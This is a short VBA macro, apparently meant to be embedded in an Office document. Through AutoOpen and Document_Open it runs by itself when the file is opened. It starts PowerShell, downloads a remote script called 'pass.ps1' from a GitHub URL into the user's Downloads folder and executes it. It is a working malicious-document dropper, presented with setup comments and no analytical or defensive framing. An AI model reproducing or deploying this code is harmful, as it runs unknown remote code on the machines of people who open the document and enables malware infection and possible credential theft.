Sub AutoOpen()
    ' This macro runs automatically when the document opens
    Dim powershellPath As String
    Dim downloadUrl As String
    Dim outputFile As String
    Dim psCommand As String
    
    ' Configure your download here
    downloadUrl = "https://github.com/5hank4r/pass/raw/refs/heads/main/pass.ps1"
    outputFile = "ss.ps1"  ' Note: Use .ps1 extension for PowerShell scripts
    
    ' Path to PowerShell
    powershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    ' Build PowerShell command: change directory, download file, then execute it
    psCommand = "Set-Location $env:USERPROFILE\Downloads; " & _
                "curl '" & downloadUrl & "' -o " & outputFile & "; " & _
                "./" & outputFile
    
    ' Check if PowerShell exists
    If Dir(powershellPath) <> "" Then
        ' Open PowerShell in Downloads folder and execute download command
        shell powershellPath & " -NoExit -Command " & psCommand, vbNormalFocus
    Else
        MsgBox "PowerShell not found!", vbExclamation
    End If
    
End Sub

Sub Document_Open()
    ' Alternative auto-run macro name
    AutoOpen
End Sub

